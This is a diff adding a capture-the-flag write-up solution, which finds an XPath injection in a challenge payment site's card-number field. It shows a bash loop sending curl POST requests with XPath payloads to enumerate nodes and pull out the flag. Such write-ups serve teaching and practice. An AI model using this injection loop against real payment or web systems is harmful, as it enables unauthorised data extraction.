@@ -14,7 +14,10 @@ May the Packet be with you!
 
 #### Solution:
 
+We are presented with payment web site. After tinkering with it we noticed that the `card number` field is vulnerable to `XPATH` injection.
+
 ```bash
+{ for f in `seq 1 500`; do curl -Ss 'http://really.sneaky.phishing.thecatch.cz/?click=sjlk2fgj3oiervAnjkufho3uiKrmsd5xmoudfFdfDkrEn5ers4gj2nf35jvVxKdfjbq24weqfoeire24ge8' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data "card-holder-name=aaa&card-number=//*[${f}]+//*&card-expires-date=10%2F2022&card-cvv=111&proceed-to-pay=" | grep "This"; done; } | grep FLAG
 ```
 
 ---
